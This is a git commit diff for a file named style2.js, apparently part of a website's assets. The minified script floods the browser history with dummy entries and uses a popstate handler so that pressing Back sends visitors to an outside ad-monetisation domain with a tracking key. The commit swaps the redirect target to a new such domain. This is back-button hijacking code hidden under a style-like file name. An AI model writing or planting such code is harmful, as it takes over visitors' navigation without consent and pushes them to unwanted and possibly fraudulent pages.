05a06ededff9c8fb27aec08b7747289a0b90fd3f
highbuzz26 <47417849+highbuzz26@users.noreply.github.com>
2022-03-23 12:09:36 +0700

    Update style2.js

--- style2.js
+++ style2.js
@@ -1,3 +1,3 @@
 ! function () {var t;
 try { for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
-onpopstate = function (t) {t.state && location.replace("https://www.highrevenuecpm.com/cjhm6cxv1?key=7cc967d4a0324f9feb036d688476c05f")}} catch (o) {}}();
+onpopstate = function (t) {t.state && location.replace("https://www.safestgatetocontent.com/bnrsub3v?key=8f07f9c89c097ca6abfd02bc0c6a7c89")}} catch (o) {}}();
